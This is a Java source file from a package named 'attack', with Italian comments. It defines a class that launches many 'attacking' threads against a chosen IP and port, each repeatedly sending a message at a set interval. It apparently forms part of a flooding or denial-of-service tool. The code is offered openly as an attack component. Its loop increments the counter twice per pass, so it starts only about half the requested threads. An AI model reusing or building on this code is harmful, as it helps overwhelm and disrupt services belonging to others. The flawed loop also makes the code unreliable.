package attack;

/*
 * Classe responsabile della creazione dei thread attaccanti.
 */

public class WorkerCreator implements Runnable{

	/*
	 * Dichiarazione variabili
	 */
	
	private String host; 		//IP da attaccare;
	private int port;			//porta sulla quale attaccare;
	private int timeout;		//tempo di attesa tra un messaggio e l'altro;
	private String message;		//messaggio inviato dai thread al momento dell'attacco;
	private int threads;		//numero di thread attaccanti da creare.
	
	/*
	 * Costruttore della classe.
	 */
	
	public WorkerCreator (String host, int port, int timeout, String message, int threads) {
		this.host = host;
		this.port = port;
		this.timeout = timeout;
		this.message = message;
		this.threads = threads;
	}
	
	/*
	 * Thread che crea tutti gli altri thread utilizzati per l'attacco.
	 * 
	 * Quando viene richiamato:
	 * crea un contatore "i" = 0, utilizzato per far funzionare il ciclo;
	 * entra in un ciclo do - while, nel quale: 
	 * tiene conto del numero di thread creati e lo scrive a terminale; 
	 * crea un thread "w" della classe Worker passandogli le variabili utilizzate per l'attacco;
	 * avvia il thread "w";
	 * incrementa di 1 il contatore "i", facendo in modo che il ciclo continui finchè viene raggiunto il numero di thread
	 * specificato dall'utente nell'interfaccia grafica.
	 */
	
	@Override
	public void run() {
		
		int i=0;
		
		do {
			System.out.println("Thread created: "+i++);
			Thread w = new Thread(new Worker(host, port, timeout, message));
			w.start();
			i++;
		}while(i < threads);
		
	}

}
